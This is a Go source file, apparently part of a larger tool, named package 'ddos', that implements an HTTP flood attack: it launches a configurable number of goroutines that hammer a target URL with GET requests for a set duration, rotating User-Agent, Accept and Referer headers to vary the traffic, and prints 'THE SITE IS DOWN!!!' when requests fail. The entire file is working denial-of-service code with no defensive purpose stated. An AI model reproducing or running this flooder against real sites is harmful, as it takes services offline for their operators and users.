package ddos

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
	ddos := &flooder{
		url:          url,
		workerAmount: workerAmount,
		client:       http.DefaultClient,
		stopSignal:   make(chan bool),
		startSignal:  make(chan bool),
	}

	ddos.SetDuration(duration)
	return ddos
}

type Flooder interface {
	Flood()
	Stop()
	SetWorkerAmount(workers uint16)
	SetDuration(seconds uint32)
}

type flooder struct {
	url          string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan bool
	startSignal  chan bool
	duration     time.Duration
	wg           sync.WaitGroup
	timer        *time.Timer
}

func (f *flooder) Flood() {
	for idx := uint16(0); idx < f.workerAmount; idx++ {
		time.Sleep(time.Microsecond * 100)
		f.wg.Add(1)
		go func() {
			defer f.wg.Done()
			f.flood()
		}()
		fmt.Printf("\rThreads [%.0f] are ready", float64(idx+1))
		os.Stdout.Sync()
	}

	fmt.Printf("\nPlease [Enter] for continue")
	_, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Flood will end in " + f.duration.String() + " seconds.")
	close(f.startSignal)

	f.timer = time.NewTimer(f.duration)

	select {
	case <-f.timer.C:
		f.Stop()
	}

	f.timer.Stop()
}

func (f *flooder) flood() {
	for {
		select {
		case <-f.stopSignal:
			return
		default:
			<-f.startSignal
			request := f.configRequest()

			resp, err := f.client.Do(request)
			if err == nil {
				_, copyErr := io.Copy(io.Discard, resp.Body)
				closeErr := resp.Body.Close()
				if copyErr != nil || closeErr != nil {
					log.Printf("Error occurred during response body copy or close: %v, %v", copyErr, closeErr)
				}
			} else {
				log.Printf("THE SITE IS DOWN!!!  --> ERROR MSG: %v\n", err)
			}
		}
		runtime.Gosched()
	}
}

func (f *flooder) configRequest() *http.Request {
	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	header := []string{
		"Connection: Keep-Alive, Cache-Control: max-age=0",
		"User-Agent: " + getUserAgent(),
		acceptall[rand.Intn(len(acceptall))],
		referers[rand.Intn(len(referers))],
	}

	for _, header := range header {
		splitedHeader := strings.SplitN(header, ":", 2)
		if len(splitedHeader) == 2 {
			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
		}
	}

	return defaultRequest
}

func (f *flooder) Stop() {
	close(f.stopSignal)
	f.wg.Wait()
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetDuration(seconds uint32) {
	f.duration = time.Duration(seconds) * time.Second
}
